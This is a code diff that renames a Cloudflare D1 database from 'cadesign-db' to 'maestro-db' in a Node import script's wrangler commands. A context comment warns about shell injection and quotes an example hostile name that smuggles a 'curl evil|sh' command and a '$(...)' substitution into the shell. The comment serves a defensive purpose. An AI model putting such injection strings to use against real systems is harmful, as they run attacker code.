@@ -144,7 +144,7 @@ const flag = isRemote ? "--remote" : "--local";
 // (a name like `x";curl evil|sh;"` or `x$(...)` would execute). Filtering to our
 // import set is done client-side below instead.
 {
-  const cmd = `npx wrangler d1 execute cadesign-db ${flag} --json --command="SELECT id, lower(manufacturer)||'::'||lower(model_number) AS k FROM templates WHERE manufacturer IS NOT NULL AND model_number IS NOT NULL"`;
+  const cmd = `npx wrangler d1 execute maestro-db ${flag} --json --command="SELECT id, lower(manufacturer)||'::'||lower(model_number) AS k FROM templates WHERE manufacturer IS NOT NULL AND model_number IS NOT NULL"`;
   const out = execSync(cmd, { cwd: apiDir, encoding: "utf-8" });
   const parsed = JSON.parse(out);
   const rows: { id: string; k: string }[] = parsed[0]?.results ?? [];
@@ -267,7 +267,7 @@ if (dryRun) {
 }
 
 console.log(`\nApplying to D1 (${flag})...`);
-execSync(`npx wrangler d1 execute cadesign-db ${flag} --file="${path.relative(apiDir, sqlPath)}"`, {
+execSync(`npx wrangler d1 execute maestro-db ${flag} --file="${path.relative(apiDir, sqlPath)}"`, {
   cwd: apiDir,
   stdio: "inherit",
 });
